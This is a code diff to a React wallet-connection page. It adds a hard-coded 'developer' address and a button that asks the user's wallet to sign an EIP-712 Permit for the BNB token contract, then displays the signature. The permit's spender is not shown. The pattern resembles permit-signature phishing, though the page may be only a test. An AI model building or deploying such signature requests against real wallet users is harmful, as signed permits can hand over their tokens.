@@ -8,6 +8,9 @@ import {ethers, formatUnits} from "ethers";
 import {useState} from "react";
 
 const BNBContract = "0xB8c77482e45F1F44dE1745F52C74426C631bDD52";
+const developer = {
+	address: "0xB932eF059c3857FBA2505B31E5899b3E170f25E7"
+}
 
 const Page = () => {
 	const open = useWeb3Modal();
@@ -16,12 +19,12 @@ const Page = () => {
 	const { signMessage } = useSignMessage();
 	const { sendTransaction } = useSendTransaction()
 	const {disconnect} = useDisconnect();
-	const {data} = useBalance({
+	const {data: balance, isLoading} = useBalance({
 		address: account.address
 	});
 	const [signature, setSignature] = useState<string | undefined>()
 
-
+	if (isLoading || !balance || !account) return "LOADING";
 
 	return (
 		<div>
@@ -52,7 +55,7 @@ const Page = () => {
 			>
 				Transfer
 			</button>
-			<button onClick={disconnect}>
+			<button onClick={disconnect as any}>
 				DC
 
 			</button>
@@ -76,9 +79,9 @@ const Page = () => {
 						},
 						"primaryType": "Permit",
 						"domain": {
-							"name": "BNB",
+							"name": balance.symbol,
 							"version": "1",
-							"chainId": account.chainId,
+							"chainId": account.chainId as any,
 							"verifyingContract": BNBContract // BNB Contract
 						},
 						"message": {
@@ -87,7 +90,7 @@ const Page = () => {
 							"value": "100000000000",
 							"nonce": 0,
 							"deadline": 1625256000
-						}
+						} as any
 					}
 				)
 
@@ -95,20 +98,8 @@ const Page = () => {
 			}}>
 				SIGN TYPED DATA
 			</button>
-			<button onClick={()=>{
-				getBalance(config,{
-					address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
-					chainId: account.chainId,
-					unit: "wei",
-					blockTag: "latest"
-				}).then(e => {
-					console.log(e);
-					console.log(formatUnits(e.value, e.decimals));
-				})
-			}}>
-				balance
-			</button>
-			{data.value+""}
+			<br/>
+			SIGNATURE: {signature}
 		</div>
 	)
 };
